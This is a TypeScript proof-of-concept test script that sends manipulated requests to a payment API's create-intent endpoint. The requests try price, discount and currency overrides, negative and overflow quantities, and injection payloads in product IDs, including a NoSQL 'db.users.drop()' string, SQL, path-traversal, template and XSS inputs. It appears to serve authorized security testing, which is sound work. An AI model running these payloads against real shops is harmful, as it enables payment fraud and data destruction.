/**
 * PoC: Payment Amount Manipulation & Price Tampering
 * 
 * Tests for payment-related vulnerabilities:
 * 1. Client-side price manipulation
 * 2. Currency confusion
 * 3. Negative quantity attacks
 * 4. Integer overflow in amounts
 * 
 * Run: npx ts-node security-tests/exploit-payment-manipulation.ts
 */

import axios, { AxiosResponse } from 'axios';

// ============================================
// CONFIGURATION
// ============================================
const API_BASE = 'https://api.security-test.site/api/v1';
const TIMEOUT = 10000;

// IMPORTANT: Replace with a REAL valid JWT token
const ATTACKER_JWT = 'YOUR_VALID_JWT_TOKEN_HERE';

// ============================================
// HELPER FUNCTIONS
// ============================================
function isHtmlResponse(response: AxiosResponse): boolean {
  const contentType = response.headers['content-type'] || '';
  const data = typeof response.data === 'string' ? response.data : '';
  return contentType.includes('text/html') || data.includes('<!doctype') || data.includes('<html');
}

function isValidApiResponse(response: AxiosResponse): boolean {
  const contentType = response.headers['content-type'] || '';
  return contentType.includes('application/json');
}

const headers = {
  'Authorization': `Bearer ${ATTACKER_JWT}`,
  'Content-Type': 'application/json',
  'Accept': 'application/json'
};

async function testPriceManipulation() {
  console.log('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     TEST #1: Client-Side Price Manipulation              â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  console.log('[1] Attempting to specify price in request...\n');
  
  // Attack: Try to send price/amount in request body
  const maliciousPayloads = [
    {
      name: 'Direct price override',
      payload: {
        items: [{ productId: '507f1f77bcf86cd799439011', quantity: 1 }],
        price: 0.01,  // Attacker tries to set price
        amount: 100,   // Should be 10000 but attacker sets 100 cents
      }
    },
    {
      name: 'Total amount override',
      payload: {
        items: [{ productId: '507f1f77bcf86cd799439011', quantity: 10 }],
        totalAmount: 1,  // $0.01 for 10 items
        total: 1
      }
    },
    {
      name: 'Discount injection',
      payload: {
        items: [{ productId: '507f1f77bcf86cd799439011', quantity: 1 }],
        discount: 99.99,      // 99.99% discount
        discountCode: 'HACK',
        coupon: 'FREE'
      }
    },
    {
      name: 'Currency downgrade',
      payload: {
        items: [{ productId: '507f1f77bcf86cd799439011', quantity: 1 }],
        currency: 'VND'  // Try to pay in cheaper currency
      }
    }
  ];
  
  for (const attack of maliciousPayloads) {
    console.log(`    Testing: ${attack.name}`);
    console.log(`    Payload: ${JSON.stringify(attack.payload)}`);
    
    try {
      const response = await axios.post(
        `${API_BASE}/payments/create-intent`,
        attack.payload,
        { headers, timeout: 10000, validateStatus: () => true }
      );
      
      if (response.status === 201 || response.status === 200) {
        // Check if our malicious values were used
        const data = response.data?.data;
        console.log(`    Response: ${JSON.stringify(data)}`);
        
        // Would need to verify actual Stripe amount to confirm vulnerability
        console.log(`    âš ï¸ Request accepted - verify Stripe dashboard for actual amount\n`);
      } else if (response.status === 400) {
        const message = response.data?.message || '';
        if (message.includes('cannot be specified') || message.includes('forbidden')) {
          console.log(`    âœ… Blocked: "${message}"\n`);
        } else {
          console.log(`    Rejected: ${message}\n`);
        }
      } else {
        console.log(`    Response: ${response.status} - ${response.data?.message}\n`);
      }
    } catch (error: any) {
      console.log(`    Error: ${error.message}\n`);
    }
  }
}

async function testNegativeQuantity() {
  console.log('\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     TEST #2: Negative Quantity Attack                    â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  const negativePayloads = [
    { quantity: -1, description: 'Negative quantity' },
    { quantity: -999999, description: 'Large negative' },
    { quantity: 0, description: 'Zero quantity' },
    { quantity: 0.5, description: 'Fractional quantity' },
    { quantity: -0.01, description: 'Negative fractional' },
  ];
  
  for (const test of negativePayloads) {
    console.log(`[*] Testing: ${test.description} (qty: ${test.quantity})`);
    
    try {
      const response = await axios.post(
        `${API_BASE}/payments/create-intent`,
        {
          items: [{ productId: '507f1f77bcf86cd799439011', quantity: test.quantity }]
        },
        { headers, timeout: 5000, validateStatus: () => true }
      );
      
      if (response.status === 201) {
        console.log(`    ğŸš¨ ACCEPTED! Check if negative amount was charged`);
        console.log(`    This could result in REFUNDS to attacker!\n`);
      } else {
        console.log(`    âœ… Rejected (${response.status}): ${response.data?.message}\n`);
      }
    } catch (error: any) {
      console.log(`    Error: ${error.message}\n`);
    }
  }
}

async function testIntegerOverflow() {
  console.log('\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     TEST #3: Integer Overflow Attack                     â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  const overflowValues = [
    { qty: 2147483647, desc: 'Max INT32' },
    { qty: 2147483648, desc: 'INT32 + 1 (overflow)' },
    { qty: 9007199254740991, desc: 'MAX_SAFE_INTEGER' },
    { qty: 9007199254740992, desc: 'Beyond MAX_SAFE_INTEGER' },
    { qty: Number.MAX_VALUE, desc: 'Number.MAX_VALUE' },
    { qty: 999999999999, desc: 'Very large quantity' },
  ];
  
  console.log('Testing if large quantities cause overflow in total calculation:\n');
  
  for (const test of overflowValues) {
    console.log(`[*] ${test.desc}: ${test.qty}`);
    
    try {
      const response = await axios.post(
        `${API_BASE}/payments/create-intent`,
        {
          items: [{ productId: '507f1f77bcf86cd799439011', quantity: test.qty }]
        },
        { headers, timeout: 5000, validateStatus: () => true }
      );
      
      if (response.status === 201) {
        const data = response.data?.data;
        console.log(`    ğŸš¨ ACCEPTED! Order: ${data?.orderId}`);
        console.log(`    Check if total wrapped around to small number\n`);
      } else {
        console.log(`    âœ… Rejected: ${response.data?.message}\n`);
      }
    } catch (error: any) {
      console.log(`    Error: ${error.message}\n`);
    }
  }
}

async function testProductIdManipulation() {
  console.log('\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     TEST #4: Product ID Manipulation                     â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  const maliciousIds = [
    { id: '507f1f77bcf86cd799439011; db.users.drop()', desc: 'NoSQL injection' },
    { id: "507f1f77bcf86cd799439011' OR '1'='1", desc: 'SQL injection' },
    { id: '../../../etc/passwd', desc: 'Path traversal' },
    { id: '{{7*7}}', desc: 'SSTI test' },
    { id: '<script>alert(1)</script>', desc: 'XSS in ID' },
    { id: '507f1f77bcf86cd79943901', desc: 'Invalid ObjectId (23 chars)' },
    { id: 'XXXXXXXXXXXXXXXXXXXXXXXX', desc: 'Non-hex ObjectId' },
    { id: '000000000000000000000000', desc: 'Zero ObjectId' },
  ];
  
  for (const test of maliciousIds) {
    console.log(`[*] ${test.desc}`);
    console.log(`    ID: ${test.id.substring(0, 50)}...`);
    
    try {
      const response = await axios.post(
        `${API_BASE}/payments/create-intent`,
        {
          items: [{ productId: test.id, quantity: 1 }]
        },
        { headers, timeout: 5000, validateStatus: () => true }
      );
      
      if (response.status === 201) {
        console.log(`    ğŸš¨ ACCEPTED! Possible injection vulnerability\n`);
      } else if (response.status === 400) {
        console.log(`    âœ… Rejected (validation): ${response.data?.message}\n`);
      } else if (response.status === 500) {
        console.log(`    âš ï¸ Server Error! Possible injection point\n`);
      } else {
        console.log(`    Response: ${response.status}\n`);
      }
    } catch (error: any) {
      console.log(`    Error: ${error.message}\n`);
    }
  }
}

async function testMixedCartAttack() {
  console.log('\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     TEST #5: Mixed Cart Price Confusion                  â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  console.log('Attack: Mix expensive product with cheap product,');
  console.log('        try to get expensive product at cheap price.\n');
  
  // This requires knowing actual product IDs
  const expensiveProductId = '507f1f77bcf86cd799439011'; // $1000 product
  const cheapProductId = '507f1f77bcf86cd799439012';     // $1 product
  
  const attack = {
    items: [
      { productId: expensiveProductId, quantity: 1 },
      { productId: cheapProductId, quantity: 1 },
      // Duplicate with manipulated price reference
      { productId: expensiveProductId, quantity: 1, priceRef: cheapProductId },
    ]
  };
  
  console.log('[*] Sending cart with duplicate products and price reference...');
  
  try {
    const response = await axios.post(
      `${API_BASE}/payments/create-intent`,
      attack,
      { headers, timeout: 5000, validateStatus: () => true }
    );
    
    console.log(`    Response: ${response.status}`);
    console.log(`    Data: ${JSON.stringify(response.data?.data || response.data?.message)}`);
    
    console.log('\n    Manual verification needed:');
    console.log('    - Check if all items priced from database');
    console.log('    - Verify no price lookups from client data');
  } catch (error: any) {
    console.log(`    Error: ${error.message}`);
  }
}

async function main() {
  console.log('â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—');
  console.log('â•‘     PAYMENT MANIPULATION TEST SUITE                          â•‘');
  console.log('â•‘     Target: https://security-test.site                       â•‘');
  console.log('â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n');
  
  console.log('âš ï¸  This is for authorized security testing only!\n');
  console.log('âš ï¸  May create test orders - clean up after testing!\n\n');
  
  await testPriceManipulation();
  await testNegativeQuantity();
  await testIntegerOverflow();
  await testProductIdManipulation();
  await testMixedCartAttack();
  
  console.log('\n' + '='.repeat(60));
  console.log('VERIFICATION STEPS:');
  console.log('='.repeat(60));
  console.log('1. Check Stripe Dashboard for any suspicious payments');
  console.log('2. Review created orders in database');
  console.log('3. Verify all prices come from server-side product lookup');
  console.log('4. Ensure validation strips unknown fields (stripUnknown)');
  console.log('5. Test with actual product IDs for realistic results');
}

main().catch(console.error);
